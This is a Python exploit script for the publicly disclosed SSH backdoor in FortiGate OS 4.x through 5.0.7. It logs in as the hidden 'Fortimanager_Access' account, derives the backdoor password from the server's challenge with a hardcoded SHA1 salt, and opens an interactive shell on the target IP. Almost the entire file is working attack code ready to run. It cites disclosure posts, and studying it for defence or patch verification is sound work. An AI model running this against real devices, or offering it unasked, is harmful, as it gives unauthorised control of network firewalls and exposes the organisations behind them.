#!/usr/bin/env python

# SSH Backdoor for FortiGate OS Version 4.x up to 5.0.7
# Usage: ./fgt_ssh_backdoor.py <target-ip>

# References:
# http://seclists.org/fulldisclosure/2016/Jan/26
# https://www.reddit.com/r/sysadmin/comments/40jmsr/full_disclosure_ssh_backdoor_for_fortigate_os/
# https://www.reddit.com/r/netsec/comments/40lotk/ssh_backdoor_for_fortigate_os_version_4x_up_to/

import socket
import select
import sys
import paramiko
from paramiko.py3compat import u
import base64
import hashlib
import termios
import tty
import logging

logging.basicConfig(level=logging.DEBUG)


def custom_handler(title, instructions, prompt_list):
    print "[+] SSH prompt list:       ", prompt_list
    m = hashlib.sha1()
    m.update('\x00' * 12)
    m.update(prompt_list[0][0])
    m.update('FGTAbc11*xy+Qqz27')
    m.update('\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1'
             '\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70')

    h = 'AK1' + base64.b64encode('\x00' * 12 + m.digest())
    print "[+] SSH Backdoor Password: ", h
    return [h]


def term(ssh_channel):
    oldtty = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        tty.setcbreak(sys.stdin.fileno())
        ssh_channel.settimeout(0.0)

        while True:
            r, w, e = select.select([ssh_channel, sys.stdin], [], [])
            if ssh_channel in r:
                try:
                    x = u(ssh_channel.recv(1024))
                    if len(x) == 0:
                        sys.stdout.write('\r\n - Exit SSH Shell -\r\n')
                        break
                    sys.stdout.write(x)
                    sys.stdout.flush()
                except socket.timeout:
                    pass
            if sys.stdin in r:
                x = sys.stdin.read(1)
                if len(x) == 0:
                    break
                ssh_channel.send(x)

    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)


def fortigate_ssh_connect(host, port=22):
    username = 'Fortimanager_Access'
    password = ''

    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(host, port,
                           username=username, password=password,
                           allow_agent=False, look_for_keys=False)
    except (paramiko.ssh_exception.AuthenticationException,
            paramiko.ssh_exception.SSHException) as ex:
        print("[-] %s:%s - %s" % (host, port, ex))
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("[-] %s:%s - %s" % (host, port, ex))
        return

    try:
        ssh_transport = ssh_client.get_transport()
        ssh_transport.auth_interactive(username=username,
                                       handler=custom_handler)
        ssh_channel = ssh_client.invoke_shell()
        term(ssh_channel)
    except paramiko.ssh_exception.SSHException:
        print("[-] %s:%s - %s" % (host, port, ex))


def main():
    if len(sys.argv) < 2:
        print 'Usage: ' + sys.argv[0] + ' <target-ip>'
        exit(-1)

    fortigate_ssh_connect(sys.argv[1])

if __name__ == '__main__':
    main()
